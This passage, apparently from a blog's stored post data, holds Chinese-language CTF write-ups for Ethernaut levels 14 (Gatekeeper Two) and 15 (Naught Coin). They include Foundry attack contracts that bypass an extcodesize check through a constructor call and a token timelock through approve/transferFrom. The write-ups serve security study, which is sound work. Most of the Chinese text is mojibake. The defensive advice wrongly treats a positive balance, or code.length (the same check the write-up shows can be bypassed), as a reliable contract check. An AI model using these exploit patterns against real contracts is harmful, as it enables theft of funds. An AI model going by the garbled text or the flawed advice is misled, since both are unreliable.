å¤§å°ã€‚</p>\n<ul>\n<li>å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå·²ç»éƒ¨ç½²çš„åˆçº¦ï¼Œ<code>extcodesize</code> ä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚</li>\n<li>å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Œ<code>extcodesize</code> è¿”å›0ã€‚</li>\n</ul>\n<p>è¿™ä¸ <code>gateOne</code> çš„è¦æ±‚ï¼ˆ<code>msg.sender</code> å¿…é¡»æ˜¯åˆçº¦ï¼‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½è®©ä¸€ä¸ªåˆçº¦åœ°å€çš„ <code>extcodesize</code> ä¸º0å‘¢ï¼Ÿ</p>\n<p>ç­”æ¡ˆåœ¨äºåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ï¼š<strong>å½“ä¸€ä¸ªåˆçº¦çš„ <code>constructor</code> æ­£åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥åˆçº¦çš„ä»£ç å°šæœªå®Œå…¨éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œå› æ­¤æ­¤æ—¶å¯¹è¯¥åˆçº¦åœ°å€è°ƒç”¨ <code>extcodesize</code> ä¼šè¿”å›0ã€‚</strong></p>\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ”»å‡»åˆçº¦çš„ <code>constructor</code> å†…éƒ¨è°ƒç”¨ç›®æ ‡åˆçº¦çš„ <code>enter</code> å‡½æ•°ã€‚</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> åŒ…å«ä¸€ä¸ªæœ‰è¶£çš„å¼‚æˆ–ï¼ˆXORï¼‰é€»è¾‘ã€‚è®©æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼š</p>\n<p><code>A ^ B = C</code></p>\n<p>å…¶ä¸­ï¼š</p>\n<ul>\n<li><code>A</code> æ˜¯ <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code></li>\n<li><code>B</code> æ˜¯ <code>uint64(_gateKey)</code></li>\n<li><code>C</code> æ˜¯ <code>type(uint64).max</code> (å³ <code>0xFFFFFFFFFFFFFFFF</code>)</li>\n</ul>\n<p>æ ¹æ®å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œå¦‚æœ <code>A ^ B = C</code>ï¼Œé‚£ä¹ˆ <code>A ^ C = B</code>ã€‚</p>\n<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®— <code>A ^ C</code> æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ <code>_gateKey</code>ã€‚</p>\n<p><code>_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p>\n<p>ç”±äº <code>msg.sender</code> æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”»å‡»åˆçº¦çš„ <code>constructor</code> ä¸­è®¡ç®—å‡ºè¿™ä¸ªå€¼ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éå¸¸ç®€æ´ã€‚å®ƒåœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰çš„å·¥ä½œï¼šè®¡ç®— <code>gateKey</code> å¹¶ç«‹å³è°ƒç”¨ç›®æ ‡å®ä¾‹çš„ <code>enter</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/14_GatekeeperTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Foundry æµ‹è¯•åˆçº¦</span><br><span class=\"line\">contract GatekeeperTwoTest is Test &#123;</span><br><span class=\"line\">    GatekeeperTwo instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperTwo();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå…¶æ„é€ å‡½æ•°ä¼šè‡ªåŠ¨æ‰§è¡Œæ”»å‡»</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // è®¡ç®— gateKey</span><br><span class=\"line\">        // A ^ C = B</span><br><span class=\"line\">        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class=\"line\">        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF</span><br><span class=\"line\">        bytes8 gateKey = bytes8(keyPart ^ max_uint);</span><br><span class=\"line\"></span><br><span class=\"line\">        // åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ enter å‡½æ•°</span><br><span class=\"line\">        instance.enter(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: æ”»å‡»é€»è¾‘å®Œå…¨åŒ…å«åœ¨ <code>constructor</code> ä¸­ã€‚</li>\n<li><strong>åœ¨ <code>constructor</code> ä¸­è°ƒç”¨</strong>: è¿™æ˜¯å…³é”®ã€‚åœ¨ <code>constructor</code> ä¸­è°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œæ­¤æ—¶ <code>extcodesize(address(this))</code> ä¸º0ï¼Œç»•è¿‡äº† <code>gateTwo</code>ã€‚</li>\n<li><strong>è®¡ç®— <code>_gateKey</code></strong>: åœ¨ <code>constructor</code> ä¸­ï¼Œä½¿ç”¨ <code>address(this)</code> ä½œä¸º <code>msg.sender</code> æ¥è®¡ç®— <code>keccak256</code> å“ˆå¸Œï¼Œå¹¶é€šè¿‡XORè¿ç®—å¾—åˆ°æ­£ç¡®çš„ <code>_gateKey</code>ï¼Œä»è€Œç»•è¿‡ <code>gateThree</code>ã€‚</li>\n<li><strong>éƒ¨ç½²å³æ”»å‡»</strong>: éƒ¨ç½²æ”»å‡»åˆçº¦çš„äº¤æ˜“ä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»å°±å®Œæˆäº†ï¼Œ<code>entrant</code> å°†è¢«è®¾ç½®ä¸ºæˆ‘ä»¬çš„EOAåœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>é¿å…ä½¿ç”¨ <code>extcodesize</code> è¿›è¡Œåˆçº¦æ£€æŸ¥</strong>: æ­£å¦‚æœ¬ä¾‹æ‰€ç¤ºï¼Œ<code>extcodesize</code> å¯ä»¥è¢« <code>constructor</code> è°ƒç”¨ç»•è¿‡ã€‚ä¸€ä¸ªæ›´å¯é çš„æ£€æŸ¥æ–¹æ³•æ˜¯åˆ¤æ–­ <code>address.balance &gt; 0</code> æˆ–è€… <code>address.code.length &gt; 0</code>ï¼ˆåœ¨Solidity 0.8.10åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼‰ã€‚</li>\n<li><strong>å¯¹ <code>caller</code> çš„é¢å¤–æ£€æŸ¥</strong>: å¦‚æœç¡®å®éœ€è¦é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œå¯ä»¥ç»“åˆ <code>tx.origin == msg.sender</code> çš„æ£€æŸ¥ï¼Œä½†è¿™ä¼šé™åˆ¶åˆçº¦çš„å¯ç»„åˆæ€§ã€‚</li>\n<li><strong>ç®€åŒ–å¯†é’¥éªŒè¯</strong>: å¤æ‚çš„å¯†é’¥æ´¾ç”Ÿé€»è¾‘ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„XORï¼‰å¯èƒ½çœ‹èµ·æ¥å®‰å…¨ï¼Œä½†å¦‚æœæ‰€æœ‰è¾“å…¥éƒ½æ¥è‡ªé“¾ä¸Šï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥é€†å‘å·¥ç¨‹å‡ºæ­£ç¡®çš„å¯†é’¥ã€‚åº”ä½¿ç”¨é“¾ä¸‹ç­¾åç­‰æ›´å®‰å…¨çš„æœºåˆ¶ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>constructor</code></strong>: åˆçº¦çš„æ„é€ å‡½æ•°ï¼Œä»…åœ¨åˆçº¦éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚ç†è§£å…¶åœ¨ç”Ÿå‘½å‘¨æœŸä¸­çš„ç‰¹æ®Šæ€§ï¼ˆå¦‚ <code>extcodesize</code> ä¸º0ï¼‰æ˜¯è§£å†³æ­¤ç±»æŒ‘æˆ˜çš„å…³é”®ã€‚</li>\n<li><strong><code>extcodesize</code></strong>: ä¸€ä¸ªEVMæ“ä½œç ï¼Œç”¨äºè·å–åœ°å€çš„ä»£ç å¤§å°ã€‚æ˜¯åŒºåˆ†EOAå’Œåˆçº¦çš„å¸¸ç”¨æ–¹æ³•ï¼Œä½†æœ‰å…¶å±€é™æ€§ã€‚</li>\n<li><strong>å¼‚æˆ–è¿ç®— (<code>^</code>)</strong>: ä¸€ç§ä½è¿ç®—ç¬¦ï¼Œåœ¨å¯†ç å­¦å’Œå“ˆå¸Œæ“ä½œä¸­å¾ˆå¸¸è§ã€‚ç†è§£å…¶ <code>A ^ B = C</code> &lt;&#x3D;&gt; <code>A ^ C = B</code> çš„æ€§è´¨å¯¹äºè§£å†³ <code>gateThree</code> è‡³å…³é‡è¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦åœ¨ <code>constructor</code> æ‰§è¡ŒæœŸé—´çš„ä»£ç å¤§å°ï¼ˆ<code>extcodesize</code>ï¼‰ä¸º0ã€‚</li>\n<li><code>caller()</code> å’Œ <code>address(this)</code> åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­çš„åŒºåˆ«å’Œè”ç³»ã€‚</li>\n<li>å¼‚æˆ–ï¼ˆXORï¼‰è¿ç®—çš„å¯é€†æ€§æ˜¯è§£å†³å¯†ç å­¦ç›¸å…³è°œé¢˜çš„å¸¸ç”¨å·¥å…·ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨ <code>constructor</code> çš„ç‰¹æ€§ç»•è¿‡ <code>extcodesize</code> æ£€æŸ¥ã€‚</li>\n<li>åœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ï¼Œå®ç°â€œéƒ¨ç½²å³æ”»å‡»â€ã€‚</li>\n<li>é€†å‘å·¥ç¨‹XORé€»è¾‘ä»¥è®¡ç®—å‡ºæ‰€éœ€çš„å¯†é’¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸è¦ä¾èµ– <code>extcodesize</code> æ¥åˆ¤æ–­ä¸€ä¸ªåœ°å€æ˜¯å¦ä¸ºåˆçº¦ã€‚</li>\n<li>è®¾è®¡æ›´ç®€å•ã€æ›´ç›´æ¥çš„éªŒè¯æœºåˆ¶ï¼Œé¿å…æ¨¡ç³Šçš„é“¾ä¸Šå¯†é’¥æ´¾ç”Ÿã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction\">Solidity Docs: <code>extcodesize</code> Caveats</a></li>\n<li><a href=\"https://www.evm.codes/\">Understanding the EVM: Opcodes</a></li>\n</ul>\n"},{"title":"Ethernaut Level 15: Naught Coin - ERC20 approve/transferFromæ¼æ´","date":"2025-01-25T08:20:00.000Z","updated":"2025-01-25T08:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨ERC20æ ‡å‡†ä¸­çš„ `approve` å’Œ `transferFrom` ç»„åˆï¼Œç»•è¿‡ä¸å®Œæ•´çš„ `transfer` å‡½æ•°é™åˆ¶ã€‚æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†å’Œç»§æ‰¿è¦†ç›–çš„å®‰å…¨æ€§å½±å“ï¼ŒæŒæ¡ Naught Coin å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve/transferFromæ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 15 - Naught Coin](https://ethernaut.openzeppelin.com/level/15)  \n> **æ”»å‡»ç±»å‹**: ERC20 `approve`/`transferFrom` æ¼æ´  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½œä¸º `player`ï¼Œä½ åˆå§‹æ‹¥æœ‰å…¨éƒ¨çš„ `NaughtCoin` ä»£å¸ã€‚ç„¶è€Œï¼Œåˆçº¦ä¸­çš„ `transfer` å‡½æ•°è¢«é”å®šï¼Œåå¹´å†…æ— æ³•è½¬ç§»ä»£å¸ã€‚ä½ çš„ç›®æ ‡æ˜¯åœ¨é”å®šæœŸç»“æŸå‰ï¼Œå°†ä½ çš„å…¨éƒ¨ä»£å¸ä»ä½ çš„åœ°å€ä¸­è½¬ç§»å‡ºå»ã€‚\n\n![Naught Coin Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ `NaughtCoin` åˆçº¦ã€‚å®ƒç»§æ‰¿è‡ª OpenZeppelin çš„ `ERC20` æ ‡å‡†åˆçº¦ã€‚\n\n```solidity\ncontract NaughtCoin is ERC20 {\n    uint public timeLock;\n    address public player;\n\n    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {\n        player = _player;\n        timeLock = block.timestamp + 10 * 365 days;\n        _mint(player, 1000000 * (10**18));\n    }\n\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(block.timestamp > timeLock, \"NaughtCoin: time lock is active\");\n            _;\n        } else {\n            _;\n        }\n    }\n\n    // Override transfer to lock tokens for the player\n    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {\n        return super.transfer(_to, _value);\n    }\n    \n    // Other functions are inherited from ERC20\n}\n```\n\nåˆçº¦é€šè¿‡ `override` é‡å†™äº† `transfer` å‡½æ•°ï¼Œå¹¶ä¸ºå…¶å¢åŠ äº†ä¸€ä¸ª `lockTokens` ä¿®é¥°ç¬¦ã€‚è¿™ä¸ªä¿®é¥°ç¬¦ä¼šæ£€æŸ¥ `msg.sender` æ˜¯å¦ä¸º `player`ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¦æ±‚ `block.timestamp` å¤§äº `timeLock`ï¼ˆåå¹´ä¹‹åï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä½œä¸º `player`ï¼Œæ— æ³•ç›´æ¥è°ƒç”¨ `transfer` å‡½æ•°æ¥è½¬ç§»ä»£-ç¬”ã€‚\n\nç„¶è€Œï¼Œå¼€å‘è€…åªé‡å†™äº† `transfer` å‡½æ•°ï¼Œå´å¿½ç•¥äº† `ERC20` æ ‡å‡†ä¸­çš„å¦ä¸€ä¸ªé‡è¦çš„ä»£å¸è½¬ç§»å‡½æ•°ï¼š`transferFrom(address from, address to, uint256 amount)`ã€‚\n\n`transferFrom` å‡½æ•°å…è®¸ä¸€ä¸ªåœ°å€ï¼ˆ`spender`ï¼‰åœ¨å¾—åˆ° `owner` æˆæƒï¼ˆ`approve`ï¼‰åï¼Œä» `owner` çš„è´¦æˆ·ä¸­è½¬ç§»ä»£å¸åˆ°ä»»ä½•åœ°å€ã€‚\n\nç”±äº `NaughtCoin` åˆçº¦æ²¡æœ‰é‡å†™ `transferFrom`ï¼Œå®ƒå°†ç›´æ¥ä½¿ç”¨ OpenZeppelin `ERC20` åˆçº¦ä¸­çš„åŸå§‹å®ç°ï¼Œè€Œè¿™ä¸ªåŸå§‹å®ç°æ˜¯æ²¡æœ‰ `lockTokens` ä¿®é¥°ç¬¦çš„ï¼\n\nå› æ­¤ï¼Œæ”»å‡»è·¯å¾„å˜å¾—æ¸…æ™°ï¼š\n1.  æˆ‘ä»¬ï¼ˆ`player`ï¼‰è°ƒç”¨ `approve` å‡½æ•°ï¼Œæˆæƒç»™å¦ä¸€ä¸ªåœ°å€ï¼ˆå¯ä»¥æ˜¯è‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»»ä½•å…¶ä»–åœ°å€ï¼‰è½¬ç§»æˆ‘ä»¬çš„å…¨éƒ¨ä»£å¸ã€‚\n2.  æˆ‘ä»¬ï¼ˆæˆ–è¢«æˆæƒçš„åœ°å€ï¼‰è°ƒç”¨ `transferFrom` å‡½æ•°ï¼Œå°†ä»£å¸ä»æˆ‘ä»¬çš„è´¦æˆ·ä¸­è½¬ç§»å‡ºå»ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\nåœ¨ Foundry æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ”»å‡»åˆçº¦ï¼Œå› ä¸º `player` å¯ä»¥æˆæƒç»™è‡ªå·±æ¥æ‰§è¡Œ `transferFrom`ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/15_NaughtCoin.sol\";\n\ncontract NaughtCoinTest is Test {\n    NaughtCoin instance;\n    address player1;\n    address player2;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        player2 = vm.addr(2); // ä¸€ä¸ªç”¨äºæ¥æ”¶ä»£å¸çš„åœ°å€\n        instance = new NaughtCoin(player1);\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n\n        // è·å– player1 çš„å…¨éƒ¨ä½™é¢\n        uint256 playerBalance = instance.balanceOf(player1);\n\n        // æ­¥éª¤ 1: player1 æˆæƒç»™ player1 (è‡ªå·±) è½¬ç§»å…¨éƒ¨ä½™é¢\n        instance.approve(player1, playerBalance);\n\n        // æ­¥éª¤ 2: player1 è°ƒç”¨ transferFrom å°†è‡ªå·±çš„ä»£å¸è½¬ç§»åˆ° player2\n        instance.transferFrom(player1, player2, playerBalance);\n\n        // éªŒè¯ç»“æœ\n        assertEq(instance.balanceOf(player1), 0);\n        assertEq(instance.balanceOf(player2), playerBalance);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è·å–ä½™é¢**: é¦–å…ˆï¼Œç¡®å®š `player` åœ°å€æ‹¥æœ‰çš„ä»£å¸æ€»é‡ã€‚\n2.  **æˆæƒ (`approve`)**: `player` è°ƒç”¨ `instance.approve(spender, amount)`ï¼Œå…¶ä¸­ `spender` æ˜¯è¢«æˆæƒçš„åœ°å€ï¼Œ`amount` æ˜¯æˆæƒé¢åº¦ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®© `player` æˆæƒç»™è‡ªå·±å…¨éƒ¨ä½™é¢ã€‚\n3.  **è½¬ç§» (`transferFrom`)**: `player` è°ƒç”¨ `instance.transferFrom(from, to, amount)`ï¼Œå…¶ä¸­ `from` æ˜¯ `player` åœ°å€ï¼Œ`to` æ˜¯æ¥æ”¶åœ°å€ï¼Œ`amount` æ˜¯è¦è½¬ç§»çš„æ•°é‡ã€‚\n\nè¿™ä¸ªè¿‡ç¨‹æˆåŠŸåœ°ç»•è¿‡äº† `transfer` å‡½æ•°çš„ `timeLock` é™åˆ¶ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **å®Œæ•´åœ°è¦†ç›–å‡½æ•°**: å½“ç»§æ‰¿ä¸€ä¸ªæ ‡å‡†ï¼ˆå¦‚ERC20ï¼‰å¹¶æ‰“ç®—ä¿®æ”¹å…¶æ ¸å¿ƒåŠŸèƒ½æ—¶ï¼Œå¿…é¡»ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½è¢«ä¸€è‡´åœ°ä¿®æ”¹ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œå¦‚æœ `transfer` è¢«é”å®šï¼Œé‚£ä¹ˆ `transferFrom` ä¹Ÿåº”è¯¥è¢«åŒæ ·çš„æ–¹å¼é”å®šã€‚\n\n    ```solidity\n    // æ­£ç¡®çš„ä¿®å¤æ–¹å¼\n    function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) {\n        return super.transferFrom(from, to, value);\n    }\n    ```\n\n2.  **ä½¿ç”¨æˆç†Ÿçš„ä»£å¸é”å®šåˆçº¦**: ä¸å…¶è‡ªå·±å®ç°æ—¶é—´é”ï¼Œä¸å¦‚ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚ OpenZeppelin çš„ `TokenTimelock` åˆçº¦ã€‚è¿™äº›åˆçº¦å·²ç»è€ƒè™‘äº†å„ç§è¾¹ç¼˜æƒ…å†µã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **ERC20 æ ‡å‡†**: æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†çš„å…¨éƒ¨æ¥å£æ˜¯è‡³å…³é‡è¦çš„ï¼ŒåŒ…æ‹¬ `transfer`, `approve`, `transferFrom`, `balanceOf`, `allowance` ç­‰ã€‚\n-   **å‡½æ•°è¦†ç›– (`override`)**: åœ¨Solidityä¸­ï¼Œå½“å­åˆçº¦éœ€è¦ä¿®æ”¹çˆ¶åˆçº¦çš„è¡Œä¸ºæ—¶ï¼Œä½¿ç”¨ `override` å…³é”®å­—ã€‚ä½†å¿…é¡»å°å¿ƒï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„è¡Œä¸ºéƒ½è¢«è¦†ç›–ï¼Œä»¥é¿å…äº§ç”Ÿæ¼æ´ã€‚\n-   **Foundry `prank`**: `vm.startPrank` æ˜¯æ¨¡æ‹Ÿç‰¹å®šåœ°å€ï¼ˆå¦‚ `player`ï¼‰æ‰§è¡Œæ“ä½œçš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—åœ¨æµ‹è¯•ä¸­æ¨¡æ‹Ÿå¤šæ­¥æ”»å‡»æµç¨‹å˜å¾—ç®€å•ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   ERC20æ ‡å‡†å®šä¹‰äº†ä¸€å¥—ä»£å¸äº¤äº’çš„æ¥å£ï¼Œä»…ä»…é™åˆ¶å…¶ä¸­ä¸€ä¸ªï¼ˆ`transfer`ï¼‰æ˜¯ä¸å¤Ÿçš„ã€‚\n-   `approve` å’Œ `transferFrom` çš„ç»„åˆæ˜¯ERC20çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå…è®¸ç¬¬ä¸‰æ–¹ä»£ä¸ºè½¬ç§»ä»£å¸ã€‚\n-   åœ¨è¿›è¡Œåˆçº¦ç»§æ‰¿å’Œå‡½æ•°è¦†ç›–æ—¶ï¼Œå¿…é¡»ä¿æŒé€»è¾‘çš„ä¸€è‡´æ€§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¼•å…¥æ¼æ´ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   è¯†åˆ«å‡ºåˆçº¦åªé™åˆ¶äº† `transfer` å‡½æ•°ï¼Œè€Œæ²¡æœ‰é™åˆ¶ `transferFrom` å‡½æ•°ã€‚\n-   åˆ©ç”¨ `approve` å’Œ `transferFrom` çš„æ ‡å‡†åŠŸèƒ½æ¥ç»•è¿‡ä¸å®Œæ•´çš„å®‰å…¨é™åˆ¶ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   åœ¨ä¿®æ”¹ç»§æ‰¿åˆçº¦çš„åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œå…¨é¢çš„å½±å“åˆ†æï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½å¾—åˆ°ä¸€è‡´çš„å¤„ç†ã€‚\n-   ä¼˜å…ˆä½¿ç”¨ç»è¿‡ç¤¾åŒºå®¡è®¡å’ŒéªŒè¯çš„æ ‡å‡†å®ç°ï¼Œè€Œä¸æ˜¯è‡ªå·±é‡æ–°å‘æ˜è½®å­ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [ERC20 Token 